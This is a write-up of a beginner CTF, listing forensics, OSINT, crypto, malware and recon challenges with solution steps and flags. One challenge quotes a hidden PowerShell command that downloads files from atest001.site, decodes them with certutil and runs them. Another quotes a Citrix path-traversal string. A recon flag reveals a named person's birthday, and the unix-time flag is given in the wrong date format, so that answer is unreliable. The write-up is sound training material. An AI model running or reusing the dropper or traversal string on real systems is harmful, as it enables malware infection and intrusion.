# Leap Day CTF

## Forensics

### Where in the World
50
Question: Where is the subject building located (city)?

spaceship.jpg

Procedure:

Run the image through images.google.com for reverse image search. The name of the building, ING House, comes out directly as part of the initial results. Right beneath that says the building is located in Amsterdam, Netherlands.

Flag: Amsterdam

### Data for the Win
50
Capture.pcap Find the phrase about packets.

Procedure:

Open up capture.pcap in Wireshark, the first packet is a FTP-DATA which seems a bit weird. Looking down at the hex, the phrase is displayed in plaintext at the end.

Flag: packet crafting is fun!


### Trees
50
Find the hidden message in tree.jpg.

Procedure:

Nothing special from looking at the image. Opened up the image in a hex editor, scrolled to the end and found the phrase: "secret word is sunset"

Flag: sunset


### OS?
50
What is the operating system for the server at scanme.nmap.org

Procedure:

Perform nmap scan with -A for all, within the service info showed the OS as Linux.

Flag: Linux


### I remember when
50
How many established network connections are evident in the file leapday.mem located at https://drive.google.com/file/d/1qATeOuxn4yP5YvdfKjbtB57LxI88NbQU/view?usp=sharing?

Procedure:
Use netscan in Volatility for all netwrok connection on the image. Counted the ones that are established.

Flag: 4


### I prefer vodka
50
What is the caption aka description in the file casks.jpg? (photo courtesy of Jeffrey Friedl)

Procedure:

Checked the metadata for casks.jpg, the caption/description is displayed in plaintext.

Flag: if you like whisky


###Creepy Dollz
100
What type of camera was used to take this picture? Where was it taken? [case-sensitive answer syntax: camera:city]

Procedure:

Check metadata of image, showed camera model as SpyCamera, check the GPS section of the image, the longtitude and latitude shows the image being taken in Portland.

Flag: SpyCamera:Portland

### Here Doggy, Doggy
100
Find the hidden message. (don't include brackets, just the text)

Procedure:

Opened up the gif in the text editor and scrolled to the bottom. Found the string containing the flag and used the content between the brackets for the flag.

Flag: s3curitydawg

### More memories
100
What was the parent process for FTK Imager in the file leapday.mem located at https://drive.google.com/file/d/1qATeOuxn4yP5YvdfKjbtB57LxI88NbQU/view?usp=sharing?

Procedure:

Use pslist in Volatlitity to list all process. Located the FTK Imager on the last row, scrolled through the list to look for the parent process.

Flag: explorer.exe


### Memorize this
100
What domain is associated with the cookie file OS4TRFYL.txt in the file leapday.mem located at https://drive.google.com/file/d/1qATeOuxn4yP5YvdfKjbtB57LxI88NbQU/view?usp=sharing?

Flag: -NOT SOLVED-


======================================================
## Google-fu

### How very hexing
10
Decipher this: 6f 75 72 20 64 65 6d 6f 63 72 61 63 79 20 68 61 73 20 62 65 65 6e 20 68 61 63 6b 65 64

Procedure:
Decode the hex.

Flag: our democracy has been hacked



### We've Got You Covered
10
QlNpZGVzQ2hhcm0=

Procedure:
Decode with Base64 decoder.

Flag: BSidesCharm



### Not That Kind of Hash
10
A075D17F3D453073853F813838C15B8023B8C487038436354FE599C3942E1F95

Procedure:
As mentioned in the title, the string is a hash, ran it through [crackstation.net](https://crackstation.net/) to crack the hash.

Flag: p@ssw0rd



### Ain't Nobody Got Time for That
25
1527825600 (format as MMDDYYYY)

Procedure:

Did some google search on dates and this seems to match the unix time format. Searched for "1527825600 unix time" and google provided the answer.

Flag: 01062018



### Can I get your number?
25
Whose phone number is this - 867-5309?

Procedure:

Quick Google search for the number and returned results for a song called "867-5309" also known as "Jenny"

Flag: jenny


### We're going on a safari
25
What animal is associated with this case coding: womensCyberjutsuWasFoundedIn2012

Procedure:
From previous knowledge, I can tell this is camel case.

flag: camel


### Tyrone is so Dashing ;)
50
-.-. -.-- -... . .-. ... . -.-. ..- .-. .. - -.--

Procedure:

Decode the morse code for flag.

flag: CYBERSECURITY


### Bye Bye
50
Name the artist

01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110111 01110111 01110111 00101110 01111001 01101111 01110101 01110100 01110101 01100010 01100101 00101110 01100011 01101111 01101101 00101111 01110111 01100001 01110100 01100011 01101000 00111111 01110110 00111101 01000101 01101111 00101101 01001011 01101101 01001111 01100100 00110011 01101001 00110111 01110011

Procedure:

Decode the binary and it returns a link to a youtube video. Go to the video and see that the artist is "\*NSYNC".

Flag: NSYNC


### Way Back When
50
On 7 Nov 2010, how many SecurityBSides events were listed in the USA?

Procedure:
The title hints to use the Wayback Machine. Open up the snapshot of SecurityBSdies's website for that day and scroll down to the events section to count.


flag: 14


### Malware. It's not just for Windows.
50
What is the likely target device for this malware: https://www.virustotal.com/gui/file/a122608a65ab27ac10cf6405bf54dbe62494329f87b0c1af685a64209977e98a/details.

flag: -NOT SOLVED-


### You can make slime out of paste, right?
50
There's a page on a popular site created on 29 February containing a recipe for monster slime. What is the full URL?

flag: -NOT SOLVED-


### Vitamin C?
50
What vulnerability is associated with this string: username="../../../netscaler/portal/templates/? (answer in the form of CVE-YYYY-#####)

Procedure:

Search on google with the string and CVE. First result provides the answer.

flag: CVE-2019-19781 


### What con was that?
50
At what con was this picture taken? (ladies.jpeg)

Procedure:
Reverse image search on google and saw the hackerhalted hashtag on the caption for the exact image.

flag: Hacker Halted


### And, then I...
100
4A & 2D (give the answer in decimal)

flag: -NOT SOLVED-


### It's only 10 months away
100
According to nmap.org, what type of scan can be observed in xscan.pcap?

Procedure:
Look at nmap.org's page on scan types and compare with the packets captured. 

flag: Xmas

==================
## Crypto

### You Should Join
25
Qigyh'm Miwcyns iz Wsvyldonmo

flag: Women's Society of Cyberjutsu


### Do this now
50
Decipher this Wlmzgv mld gl Gsv Wrzmz Rmrgrzgrev

flag: Donate now to The Diana Initiative


### 13 is not the lucky number
50
Decipher this and identify who said it: Mj csy’vi qeomrk qmwxeoiw mx qierw csy’vi syx xlivi hsmrk wsqixlmrk.

If you’re making mistakes it means you’re out there doing something. (rot 4)

flag: Neil Gaiman


### Where are my keys?
100
Decipher this: dc3290e9f8de66daf4c2aa31606e1d0f889e3dd47477d1f5f510294d4338686185f9f955b9bab6fd

You'll need a key. Twitter might be a good place to look.

flag: -NOT SOLVED-

======================================================
## Exploitation


### Shellz
50
Webshell.pcap What is the IP address of the web server?

flag: 192.168.56.102


### The Bait
50
Examine the sandbox analysis at https://app.any.run/tasks/1c4731a7-9a6a-4bac-a5a8-cc7a7dcc5192/.

What was the file name of the phishing attachment?

flag: attached quotation.rar


### Nevertheless she persisted
50
Examine the sandbox analysis at https://app.any.run/tasks/3746c0cc-85ef-48ff-a9eb-8a076e06b419/.

What value was used to establish persistence?

flag: C:\Users\admin\AppData\Roaming\cVfZO\Sevlu.exe


### MoreShellz
100
Webshell.pcap What file did the attacker leverage to gain information about the webserver?

flag: badshell.php


### ShellzAgain
100
Webshell.pcap

What was the contents of secrets.txt?

flag: This should not be accessible to the outside world!



### Feel the Power
100
Review the following command: powershell -windowstyle hidden -command Import-Module BitsTransfer; Start-BitsTransfer -Source http://atest001.site/GeTaj.dat,http://atest001.site/FedAl.dat,http://atest001.site/VNGg.dat -Destination "$env:TEMP\vido.com","$env:TEMP\sfera","$env:TEMP\VNGg.com"; Set-Location -Path "$env:TEMP"; certutil -decode sfera polp; Start-Process vido.com -ArgumentList polp

What malware family did this activity come from?

flag: -NOT SOLVED-

======================================================
## Malware

### Ping pong
50
Examine the sandbox analysis at https://app.any.run/tasks/16c5ed20-ac5f-4b87-84cb-2466b5126f9d/.

What domain did the malware ping out to?

flag: pixeldrain.com

### Checking in
100
Examine the sandbox analysis here: https://app.any.run/tasks/99dfb3fc-e304-4df7-8318-b087286fd498/.

What city was the victim located in?

flag: London

======================================================
## Encoding

### What's Cooking?
100
Decode this string and find the flag: BUDBCQAgEFrFoVqgxMuDXvVqexkW6syNfuBfurQq.

flag: -NOT SOLVED-

======================================================
## Recon

### Certify this
25
What is the domain name associated with this cert: 0e85bfc496428865e4a01845a661e73ef8b257d100497b06d35d68274b1a8dbb.

flag: -NOT SOLVED-


Reconning the book of faces
50
What is the event ID, according to Facebook, of the BSidesCharm 2019 Party happening later today?

site:facebook.com BSidesCharm 2019 Party

flag: 156052588657688


TXT me when you find the answer
50
There's a flag hidden in the records for marcellelee.com. (include punctuation)


flag: Woot, you found it!


### Researching the researcher
50
When is Joe Gray's (@C_3PJoe) birthday? (answer in this form MM:DD)

flag: 03:03


### Mark it Down
100
Find the hidden message in https://marcellelee.github.io.

flag: <!-- this-is-a-hidden-flag -->

======================================================
## Scanning

### F**
10
What two port numbers are associated with FTP? [answer like this: number and number]

flag: 20 and 21


### ScanMe
25
scanme.nmap.org
What service is running on port 2288?

flag: netml



